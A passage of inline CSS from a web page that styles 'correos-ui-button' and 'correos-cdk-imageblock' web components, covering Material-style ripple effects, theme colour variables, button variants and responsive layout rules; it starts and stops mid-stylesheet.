			.mdc-button.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::before,
			.mdc-button.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::after {
				position: absolute;
				border-radius: 50%;
				opacity: 0;
				pointer-events: none;
				content: ""
			}

			.mdc-button.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::before {
				-webkit-transition: opacity 15ms linear, background-color 15ms linear;
				transition: opacity 15ms linear, background-color 15ms linear;
				z-index: 1
			}

			.mdc-button.mdc-ripple-upgraded.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::before {
				-webkit-transform: scale(var(--mdc-ripple-fg-scale, 1));
				transform: scale(var(--mdc-ripple-fg-scale, 1))
			}

			.mdc-button.mdc-ripple-upgraded.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::after {
				top: 0;
				left: 0;
				-webkit-transform: scale(0);
				transform: scale(0);
				-webkit-transform-origin: center center;
				transform-origin: center center
			}

			.mdc-button.mdc-ripple-upgraded--unbounded.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::after {
				top: var(--mdc-ripple-top, 0);
				left: var(--mdc-ripple-left, 0)
			}

			.mdc-button.mdc-ripple-upgraded--foreground-activation.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::after {
				-webkit-animation: mdc-ripple-fg-radius-in 225ms forwards, mdc-ripple-fg-opacity-in 75ms forwards;
				animation: mdc-ripple-fg-radius-in 225ms forwards, mdc-ripple-fg-opacity-in 75ms forwards
			}

			.mdc-button.mdc-ripple-upgraded--foreground-deactivation.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::after {
				-webkit-animation: mdc-ripple-fg-opacity-out 150ms;
				animation: mdc-ripple-fg-opacity-out 150ms;
				-webkit-transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1));
				transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1))
			}

			.mdc-button.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::before,
			.mdc-button.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::after {
				top: calc(50% - 100%);
				left: calc(50% - 100%);
				width: 200%;
				height: 200%
			}

			.mdc-button.mdc-ripple-upgraded.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::after {
				width: var(--mdc-ripple-fg-size, 100%);
				height: var(--mdc-ripple-fg-size, 100%)
			}

			.mdc-button.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::before,
			.mdc-button.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::after {
				background-color: #6200ee
			}

			@supports not (-ms-ime-align: auto) {

				.mdc-button.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::before,
				.mdc-button.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::after {
					background-color: var(--mdc-theme-primary, #6200ee)
				}
			}

			.mdc-button.sc-correos-ui-button:hover .mdc-button__ripple.sc-correos-ui-button::before {
				opacity: 0.04
			}

			.mdc-button.mdc-ripple-upgraded--background-focused.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::before,
			.mdc-button.sc-correos-ui-button:not(.mdc-ripple-upgraded):focus .mdc-button__ripple.sc-correos-ui-button::before {
				-webkit-transition-duration: 75ms;
				transition-duration: 75ms;
				opacity: 0.12
			}

			.mdc-button.sc-correos-ui-button:not(.mdc-ripple-upgraded) .mdc-button__ripple.sc-correos-ui-button::after {
				-webkit-transition: opacity 150ms linear;
				transition: opacity 150ms linear
			}

			.mdc-button.sc-correos-ui-button:not(.mdc-ripple-upgraded):active .mdc-button__ripple.sc-correos-ui-button::after {
				-webkit-transition-duration: 75ms;
				transition-duration: 75ms;
				opacity: 0.12
			}

			.mdc-button.mdc-ripple-upgraded.sc-correos-ui-button {
				--mdc-ripple-fg-opacity: 0.12
			}

			.mdc-button.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button {
				position: absolute;
				-webkit-box-sizing: content-box;
				box-sizing: content-box;
				width: 100%;
				height: 100%;
				overflow: hidden
			}

			.mdc-button.sc-correos-ui-button:not(.mdc-button--outlined) .mdc-button__ripple.sc-correos-ui-button {
				top: 0;
				left: 0
			}

			.mdc-button--raised.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::before,
			.mdc-button--raised.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::after,
			.mdc-button--unelevated.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::before,
			.mdc-button--unelevated.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::after {
				background-color: #fff
			}

			@supports not (-ms-ime-align: auto) {

				.mdc-button--raised.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::before,
				.mdc-button--raised.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::after,
				.mdc-button--unelevated.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::before,
				.mdc-button--unelevated.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::after {
					background-color: var(--mdc-theme-on-primary, #fff)
				}
			}

			.mdc-button--raised.sc-correos-ui-button:hover .mdc-button__ripple.sc-correos-ui-button::before,
			.mdc-button--unelevated.sc-correos-ui-button:hover .mdc-button__ripple.sc-correos-ui-button::before {
				opacity: 0.08
			}

			.mdc-button--raised.mdc-ripple-upgraded--background-focused.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::before,
			.mdc-button--raised.sc-correos-ui-button:not(.mdc-ripple-upgraded):focus .mdc-button__ripple.sc-correos-ui-button::before,
			.mdc-button--unelevated.mdc-ripple-upgraded--background-focused.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::before,
			.mdc-button--unelevated.sc-correos-ui-button:not(.mdc-ripple-upgraded):focus .mdc-button__ripple.sc-correos-ui-button::before {
				-webkit-transition-duration: 75ms;
				transition-duration: 75ms;
				opacity: 0.24
			}

			.mdc-button--raised.sc-correos-ui-button:not(.mdc-ripple-upgraded) .mdc-button__ripple.sc-correos-ui-button::after,
			.mdc-button--unelevated.sc-correos-ui-button:not(.mdc-ripple-upgraded) .mdc-button__ripple.sc-correos-ui-button::after {
				-webkit-transition: opacity 150ms linear;
				transition: opacity 150ms linear
			}

			.mdc-button--raised.sc-correos-ui-button:not(.mdc-ripple-upgraded):active .mdc-button__ripple.sc-correos-ui-button::after,
			.mdc-button--unelevated.sc-correos-ui-button:not(.mdc-ripple-upgraded):active .mdc-button__ripple.sc-correos-ui-button::after {
				-webkit-transition-duration: 75ms;
				transition-duration: 75ms;
				opacity: 0.24
			}

			.mdc-button--raised.mdc-ripple-upgraded.sc-correos-ui-button,
			.mdc-button--unelevated.mdc-ripple-upgraded.sc-correos-ui-button {
				--mdc-ripple-fg-opacity: 0.24
			}

			.mdc-button.sc-correos-ui-button {
				height: 36px
			}

			.sc-correos-ui-button-h {
				--_ui-button-font-family: var(--ui-button-font-family, sans-serif);
				--_ui-button-min-width: var(--ui-button-min-width, 12rem);
				--_ui-button-border-radius: var(--ui-button-border-radius, 8px);
				--_ui-button-bg-color: var(--ui-button-bg-color, magenta);
				--_ui-button-bg-color-disabled: var(--ui-button-bg-color-disabled, gray);
				--_ui-button-bg-color-hover: var(--ui-button-bg-color-hover, green);
				--_ui-button-text-color: var(--ui-button-text-color, white);
				--_ui-button-color: var(--ui-button-color, #002e6d);
				--_ui-button-border-color: var(--ui-button-border-color, transparent);
				--_ui-button-border-color-disabled: var(--ui-button-border-color-disabled, none);
				--_ui-button-border: var(--ui-button-border, transparent);
				--_ui-button-text-color-hover: var(--ui-button-text-color-hover, red)
			}

			[theme=primary].sc-correos-ui-button-h {
				--_ui-button-bg-color: var(--ui-button-primary-bg-color);
				--_ui-button-bg-color-disabled: var(--ui-button-primary-bg-color-disabled);
				--_ui-button-bg-color-hover: var(--ui-button-primary-bg-color-hover);
				--_ui-button-text-color: var(--ui-button-primary-text-color);
				--_ui-button-border-color: var(--ui-button-primary-border-color);
				--_ui-button-border: var(--ui-button-primary-border);
				--_ui-button-border-color-disabled: var(--ui-button-primary-border-color-disabled)
			}

			[theme=secondary].sc-correos-ui-button-h {
				--_ui-button-bg-color: var(--ui-button-secondary-bg-color);
				--_ui-button-bg-color-disabled: var(--ui-button-secondary-bg-color-disabled);
				--_ui-button-bg-color-hover: var(--ui-button-secondary-bg-color-hover);
				--_ui-button-text-color: var(--ui-button-secondary-text-color);
				--_ui-button-border-color: var(--ui-button-secondary-border-color);
				--_ui-button-border: var(--ui-button-secondary-border);
				--_ui-button-border-color-disabled: var(--ui-button-secondary-border-color-disabled)
			}

			[theme=tertiary].sc-correos-ui-button-h {
				--_ui-button-bg-color: var(--ui-button-tertiary-bg-color);
				--_ui-button-bg-color-disabled: var(--ui-button-tertiary-bg-color-disabled);
				--_ui-button-bg-color-hover: var(--ui-button-tertiary-bg-color-hover);
				--_ui-button-text-color: var(--ui-button-tertiary-text-color);
				--_ui-button-border-color: var(--ui-button-tertiary-border-color);
				--_ui-button-border: var(--ui-button-tertiary-border);
				--_ui-button-border-color-disabled: var(--ui-button-tertiary-border-color-disabled)
			}

			[theme=ghost].sc-correos-ui-button-h {
				--_ui-button-bg-color: var(--ui-button-ghost-bg-color);
				--_ui-button-bg-color-disabled: var(--ui-button-ghost-bg-color-disabled);
				--_ui-button-bg-color-hover: var(--ui-button-ghost-bg-color-hover);
				--_ui-button-text-color: var(--ui-button-ghost-text-color);
				--_ui-button-border-color: var(--ui-button-ghost-border-color);
				--_ui-button-border: var(--ui-button-ghost-border);
				--_ui-button-border-color-disabled: var(--ui-button-ghost-border-color-disabled)
			}

			[theme=default][variant=link].sc-correos-ui-button-h,
			[theme=default][variant=link-center].sc-correos-ui-button-h,
			[theme=default][variant=link-auto-height].sc-correos-ui-button-h,
			[theme=default][variant=link-auto-height-left].sc-correos-ui-button-h,
			[theme=default][variant=link-auto-height-center].sc-correos-ui-button-h,
			[theme=default][variant=link-notification].sc-correos-ui-button-h,
			[theme=default][variant=link-notification-error].sc-correos-ui-button-h,
			[theme=default][variant=header-private].sc-correos-ui-button-h {
				--_ui-button-bg-color: var(--ui-button-link-default-bg-color);
				--_ui-button-bg-color-disabled: var(--ui-button-link-default-bg-color-disabled);
				--_ui-button-bg-color-hover: var(--ui-button-link-default-bg-color-hover);
				--_ui-button-text-color: var(--ui-button-link-default-text-color);
				--_ui-button-text-color-hover: var(--ui-button-link-default-text-color-hover);
				--_ui-button-border: var(--ui-button-link-default-border);
				--_ui-button-min-width: var(--ui-button-link-default-min-width)
			}

			[theme=primary][variant=link].sc-correos-ui-button-h,
			[theme=primary][variant=link-center].sc-correos-ui-button-h,
			[theme=primary][variant=link-auto-height].sc-correos-ui-button-h,
			[theme=primary][variant=link-auto-height-left].sc-correos-ui-button-h,
			[theme=primary][variant=link-auto-height-center].sc-correos-ui-button-h,
			[theme=primary][variant=link-notification].sc-correos-ui-button-h,
			[theme=primary][variant=link-notification-error].sc-correos-ui-button-h,
			[theme=primary][variant=header-private].sc-correos-ui-button-h {
				--_ui-button-bg-color: var(--ui-button-link-primary-bg-color);
				--_ui-button-bg-color-disabled: var(--ui-button-link-primary-bg-color-disabled);
				--_ui-button-bg-color-hover: var(--ui-button-link-primary-bg-color-hover);
				--_ui-button-text-color: var(--ui-button-link-primary-text-color);
				--_ui-button-text-color-hover: var(--ui-button-link-primary-text-color-hover);
				--_ui-button-border: var(--ui-button-link-primary-border);
				--_ui-button-min-width: var(--ui-button-link-primary-min-width)
			}

			[theme=secondary][variant=link].sc-correos-ui-button-h,
			[theme=secondary][variant=link-center].sc-correos-ui-button-h,
			[theme=secondary][variant=link-auto-height].sc-correos-ui-button-h,
			[theme=secondary][variant=link-auto-height-left].sc-correos-ui-button-h,
			[theme=secondary][variant=link-auto-height-center].sc-correos-ui-button-h,
			[theme=secondary][variant=link-notification].sc-correos-ui-button-h,
			[theme=secondary][variant=link-notification-error].sc-correos-ui-button-h,
			[theme=secondary][variant=header-private].sc-correos-ui-button-h {
				--_ui-button-bg-color: var(--ui-button-link-secondary-bg-color);
				--_ui-button-bg-color-disabled: var(--ui-button-link-secondary-bg-color-disabled);
				--_ui-button-bg-color-hover: var(--ui-button-link-secondary-bg-color-hover);
				--_ui-button-text-color: var(--ui-button-link-secondary-text-color);
				--_ui-button-text-color-hover: var(--ui-button-link-secondary-text-color-hover);
				--_ui-button-border: var(--ui-button-link-secondary-border);
				--_ui-button-min-width: var(--ui-button-link-secondary-min-width)
			}

			[theme=secondary][variant=link-underline].sc-correos-ui-button-h {
				--_ui-button-bg-color: var(--ui-button-ghost-bg-color);
				--_ui-button-bg-color-disabled: var(--ui-button-link-secondary-bg-color-disabled);
				--_ui-button-bg-color-hover: var(--ui-button-link-secondary-bg-color-hover);
				--_ui-button-text-color: var(--ui-button-link-secondary-text-color);
				--_ui-button-text-color-hover: var(--ui-button-link-secondary-text-color-hover);
				--_ui-button-border: var(--ui-button-link-secondary-border);
				--_ui-button-min-width: var(--ui-button-link-secondary-min-width)
			}

			.sc-correos-ui-button-h {
				display: block
			}

			@media (max-width: 639px) {
				[full-width=true].sc-correos-ui-button-h {
					width: 100%;
					margin-right: 0 !important
				}
			}

			.sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				height: 3.5rem;
				min-width: 7rem;
				border: var(--_ui-button-border);
				text-transform: none;
				font-size: 0.875rem;
				line-height: 1.375rem;
				font-weight: bold;
				border-radius: var(--_ui-button-border-radius);
				padding: 0 1.5rem 0 1.5rem
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
					min-width: 8rem
				}
			}

			@media (max-width: 639px) {
				.sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
					height: 3rem
				}
			}

			@media (min-width: 640px) {
				.sc-correos-ui-button-h .mdc-button.equal-size.sc-correos-ui-button {
					height: 3rem
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-button-h .mdc-button.equal-size.sc-correos-ui-button {
					height: 3.5rem
				}
			}

			.sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:not(:disabled) {
				border-color: var(--_ui-button-border-color)
			}

			.sc-correos-ui-button-h .mdc-button.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button {
				border-radius: var(--_ui-button-border-radius)
			}

			.sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:not(:disabled) {
				background-color: var(--_ui-button-bg-color)
			}

			.sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:hover {
				background: var(--_ui-button-bg-color-hover)
			}

			.sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:disabled {
				background-color: var(--_ui-button-bg-color-disabled);
				border: solid 1px var(--_ui-button-border-color-disabled)
			}

			.sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:not(:disabled) {
				color: var(--_ui-button-text-color)
			}

			.sc-correos-ui-button-h .mdc-button.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::after,
			.sc-correos-ui-button-h .mdc-button.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::before {
				background-color: var(--_ui-button-text-color)
			}

			.sc-correos-ui-button-h .mdc-button.sc-correos-ui-button .mdc-button__label.sc-correos-ui-button {
				letter-spacing: 0;
				font-family: var(--theme-fontFamily-main)
			}

			.sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:focus {
				outline: none
			}

			.sc-correos-ui-button-h .mdc-button.focus-visible.sc-correos-ui-button {
				outline: 2px solid black
			}

			.sc-correos-ui-button-h .full-width.sc-correos-ui-button {
				width: 100%
			}

			.sc-correos-ui-button-h .uppercase.sc-correos-ui-button {
				text-transform: uppercase
			}

			.sc-correos-ui-button-h .uppercase.sc-correos-ui-button {
				text-transform: uppercase
			}

			.sc-correos-ui-button-h .mdc-touch-target-wrapper.sc-correos-ui-button:nth-child(2) {
				display: none
			}

			.sc-correos-ui-button-h .sc-correos-ui-button-s>[slot=icon-left] {
				margin-right: 1rem;
				-ms-flex-pack: end;
				justify-content: flex-end
			}

			.sc-correos-ui-button-h .sc-correos-ui-button-s>[slot=icon-right] {
				margin-left: 1rem
			}

			[variant=link].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button,
			[variant=link-center].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				font-weight: bold;
				padding: 0 0 0 0;
				min-width: auto
			}

			@media (min-width: 1024px) {

				[variant=link].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button,
				[variant=link-center].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
					min-width: auto
				}
			}

			[variant=link].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:hover,
			[variant=link-center].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:hover {
				color: var(--_ui-button-text-color-hover)
			}

			[variant=link].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:hover .mdc-button__label.sc-correos-ui-button,
			[variant=link-center].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:hover .mdc-button__label.sc-correos-ui-button {
				text-decoration: underline
			}

			[variant=link].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:disabled,
			[variant=link-center].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:disabled {
				border: none
			}

			[variant=link].sc-correos-ui-button-h .mdc-button__label.sc-correos-ui-button,
			[variant=link-center].sc-correos-ui-button-h .mdc-button__label.sc-correos-ui-button {
				text-align: initial
			}

			[variant=link].sc-correos-ui-button-h .mdc-button__ripple.sc-correos-ui-button,
			[variant=link-center].sc-correos-ui-button-h .mdc-button__ripple.sc-correos-ui-button {
				opacity: 0
			}

			[variant=link-like-banner].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				-ms-flex-pack: center;
				justify-content: center;
				padding: 0 0 0 0;
				background-color: inherit;
				min-width: auto
			}

			@media (max-width: 639px) {
				[variant=link-like-banner].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
					max-height: 34px
				}
			}

			@media (min-width: 640px) {
				[variant=link-like-banner].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
					max-height: 40px
				}
			}

			@media (min-width: 1024px) {
				[variant=link-like-banner].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
					max-height: 40px
				}
			}

			[variant=link-like-banner].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:hover {
				background-color: inherit;
				color: var(--_ui-button-text-color-hover)
			}

			[variant=link-like-banner].sc-correos-ui-button-h .mdc-button__label.sc-correos-ui-button {
				text-align: initial
			}

			[variant=link-like-banner].sc-correos-ui-button-h .mdc-button__ripple.sc-correos-ui-button {
				opacity: 0
			}

			[variant=link].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				-ms-flex-pack: start;
				justify-content: flex-start
			}

			[variant=link-center].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				-ms-flex-pack: center;
				justify-content: center
			}

			[variant=link-auto-height].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button,
			[variant=link-auto-height-left].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button,
			[variant=link-auto-height-center].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button,
			[variant=link-notification].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button,
			[variant=link-notification-error].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button,
			[variant=link-table].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				font-weight: bold;
				padding: 0 0 0 0;
				height: auto;
				width: 100%
			}

			@media (min-width: 1024px) {

				[variant=link-auto-height].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button,
				[variant=link-auto-height-left].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button,
				[variant=link-auto-height-center].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button,
				[variant=link-notification].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button,
				[variant=link-notification-error].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button,
				[variant=link-table].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
					width: 100%
				}
			}

			[variant=link-auto-height].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:hover,
			[variant=link-auto-height-left].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:hover,
			[variant=link-auto-height-center].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:hover,
			[variant=link-notification].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:hover,
			[variant=link-notification-error].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:hover,
			[variant=link-table].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:hover {
				color: var(--_ui-button-text-color-hover)
			}

			[variant=link-auto-height].sc-correos-ui-button-h .mdc-button__label.sc-correos-ui-button,
			[variant=link-auto-height-left].sc-correos-ui-button-h .mdc-button__label.sc-correos-ui-button,
			[variant=link-auto-height-center].sc-correos-ui-button-h .mdc-button__label.sc-correos-ui-button,
			[variant=link-notification].sc-correos-ui-button-h .mdc-button__label.sc-correos-ui-button,
			[variant=link-notification-error].sc-correos-ui-button-h .mdc-button__label.sc-correos-ui-button,
			[variant=link-table].sc-correos-ui-button-h .mdc-button__label.sc-correos-ui-button {
				text-align: initial
			}

			[variant=link-auto-height].sc-correos-ui-button-h .mdc-button__ripple.sc-correos-ui-button,
			[variant=link-auto-height-left].sc-correos-ui-button-h .mdc-button__ripple.sc-correos-ui-button,
			[variant=link-auto-height-center].sc-correos-ui-button-h .mdc-button__ripple.sc-correos-ui-button,
			[variant=link-notification].sc-correos-ui-button-h .mdc-button__ripple.sc-correos-ui-button,
			[variant=link-notification-error].sc-correos-ui-button-h .mdc-button__ripple.sc-correos-ui-button,
			[variant=link-table].sc-correos-ui-button-h .mdc-button__ripple.sc-correos-ui-button {
				opacity: 0
			}

			[variant=link-auto-height].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				-ms-flex-pack: start;
				justify-content: flex-start
			}

			[variant=link-auto-height-left].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				-ms-flex-pack: end;
				justify-content: flex-end
			}

			[variant=link-auto-height-center].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				-ms-flex-pack: center;
				justify-content: center
			}

			[variant=link-notification].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				-ms-flex-pack: start;
				justify-content: flex-start;
				margin-left: 24px
			}

			@media (min-width: 1024px) {
				[variant=link-notification].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
					margin-left: 40px
				}
			}

			[variant=link-notification-error].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				margin-left: 8px
			}

			@media (min-width: 1024px) {
				[variant=link-notification-error].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
					margin-left: 16px
				}
			}

			[variant=link-table].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				-ms-flex-pack: center;
				justify-content: center
			}

			[variant=tiny].sc-correos-ui-button-h {
				width: auto
			}

			[variant=tiny].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				padding: 0 1rem 0 1rem;
				min-width: auto
			}

			@media (min-width: 1024px) {
				[variant=tiny].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
					min-width: auto
				}
			}

			.sc-correos-ui-button-h[variant=tiny] .sc-correos-ui-button-s>[slot=icon-left] {
				margin-right: 0
			}

			[variant=tiny].sc-correos-ui-button-h .mdc-button__label.sc-correos-ui-button {
				display: none
			}

			[variant=no-icons-desktop].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				min-width: auto
			}

			@media (min-width: 1024px) {
				[variant=no-icons-desktop].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
					min-width: auto
				}
			}

			[variant=no-icons-desktop].sc-correos-ui-button-h .mdc-button__label.sc-correos-ui-button {
				display: none
			}

			.sc-correos-ui-button-h[variant=no-icons-desktop] .sc-correos-ui-button-s>[slot=icon-left],
			.sc-correos-ui-button-h[variant=no-icons-desktop] .sc-correos-ui-button-s>[slot=icon-right] {
				margin-right: 0
			}

			@media (min-width: 1024px) {
				[variant=no-icons-desktop].sc-correos-ui-button-h .mdc-button__label.sc-correos-ui-button {
					display: block
				}

				.sc-correos-ui-button-h[variant=no-icons-desktop] .sc-correos-ui-button-s>[slot=icon-left],
				.sc-correos-ui-button-h[variant=no-icons-desktop] .sc-correos-ui-button-s>[slot=icon-right] {
					display: none
				}
			}

			[variant=no-icons].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				min-width: auto
			}

			@media (min-width: 1024px) {
				[variant=no-icons].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
					min-width: auto
				}
			}

			.sc-correos-ui-button-h[variant=no-icons] .sc-correos-ui-button-s>[slot=icon-left] {
				display: none
			}

			[variant=link-underline].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				min-width: auto
			}

			@media (min-width: 1024px) {
				[variant=link-underline].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
					min-width: auto
				}
			}

			.sc-correos-ui-button-h[variant=link-underline] .sc-correos-ui-button-s>[slot=text] {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				font-size: 1rem;
				line-height: 1.5rem;
				text-decoration: underline;
				margin-bottom: 18px
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-button-h[variant=link-underline] .sc-correos-ui-button-s>[slot=text] {
					font-size: 1.125rem;
					line-height: 1.875rem
				}
			}

			[variant=button-center].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				font-weight: bold;
				-ms-flex-pack: center;
				justify-content: center;
				background: transparent;
				color: var(--_ui-button-color)
			}

			[iscontained=within-text].sc-correos-ui-button-h {
				display: initial
			}

			[iscontained=within-text].sc-correos-ui-button-h .mdc-touch-target-wrapper.sc-correos-ui-button {
				display: -ms-inline-flexbox;
				display: inline-flex
			}

			[iscontained=within-text].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				height: auto;
				min-width: auto
			}

			[variant=header-private].sc-correos-ui-button-h .mdc-touch-target-wrapper.sc-correos-ui-button {
				width: 100%
			}

			[variant=header-private].sc-correos-ui-button-h .mdc-touch-target-wrapper.sc-correos-ui-button .mdc-button.sc-correos-ui-button {
				font-weight: bold;
				padding: 0 0 0 0;
				-ms-flex-pack: start;
				justify-content: flex-start;
				height: auto;
				width: 100%;
				padding: 24px
			}

			@media (min-width: 1024px) {
				[variant=header-private].sc-correos-ui-button-h .mdc-touch-target-wrapper.sc-correos-ui-button .mdc-button.sc-correos-ui-button {
					width: 100%
				}
			}

			[variant=header-private].sc-correos-ui-button-h .mdc-touch-target-wrapper.sc-correos-ui-button .mdc-button.sc-correos-ui-button:hover {
				color: var(--_ui-button-text-color-hover)
			}

			[variant=header-private].sc-correos-ui-button-h .mdc-touch-target-wrapper.sc-correos-ui-button .mdc-button__label.sc-correos-ui-button {
				text-align: initial
			}

			[variant=header-private].sc-correos-ui-button-h .mdc-touch-target-wrapper.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button {
				opacity: 0
			}

			.sc-correos-ui-button-h[variant=header-private] .sc-correos-ui-button-s>[slot=icon-left] {
				margin-right: 0.5rem
			}
		</style>
		<style>
			@charset "UTF-8";

			.sc-correos-cdk-imageblock-h {
				--_cdk-imageblock-background-color: var(--cdk-imageblock-background-color, white);
				--_cdk-imageblock-border-radius: var(--cdk-imageblock-border-radius, white)
			}

			.sc-correos-cdk-imageblock-h {
				width: 100%;
				height: 100%;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: center;
				justify-content: center;
				-ms-flex-align: center;
				align-items: center;
				position: relative
			}

			.--align-top.sc-correos-cdk-imageblock-h {
				-ms-flex-align: start;
				align-items: flex-start
			}

			.sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
				width: 100%;
				margin: 0;
				padding: 0;
				overflow: hidden;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: column;
				flex-direction: column;
				-ms-flex-align: center;
				align-items: center
			}

			.sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock:after {
				content: var(--image);
				position: absolute
			}

			.sc-correos-cdk-imageblock-h figure.--with-shape.sc-correos-cdk-imageblock {
				position: relative;
				overflow: initial;
				width: 316px;
				height: 316px;
				right: 0
			}

			.sc-correos-cdk-imageblock-h figure.--with-shape.sc-correos-cdk-imageblock img.sc-correos-cdk-imageblock {
				aspect-ratio: 1/1;
				-o-object-fit: cover;
				object-fit: cover;
				max-width: 400px
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-imageblock-h figure.--with-shape.sc-correos-cdk-imageblock {
					width: auto;
					height: auto
				}
			}

			.sc-correos-cdk-imageblock-h figure.circle.sc-correos-cdk-imageblock:after {
				right: 0;
				top: 0
			}

			.sc-correos-cdk-imageblock-h figure.mediumMoon.sc-correos-cdk-imageblock:after {
				left: 0;
				top: -32px
			}

			.sc-correos-cdk-imageblock-h figure.squares.sc-correos-cdk-imageblock:after {
				right: -32px;
				bottom: -17px
			}

			.sc-correos-cdk-imageblock-h figure.rectangle.sc-correos-cdk-imageblock {
				-ms-flex-align: start;
				align-items: flex-start;
				height: auto;
				margin-bottom: 20px
			}

			.sc-correos-cdk-imageblock-h figure.rectangle.sc-correos-cdk-imageblock:after {
				z-index: 1;
				left: 40px;
				top: 60%;
				height: 0;
				-webkit-transform: rotateY(180deg) scaleY(0.5);
				transform: rotateY(180deg) scaleY(0.5)
			}

			@media (min-width: 640px) {
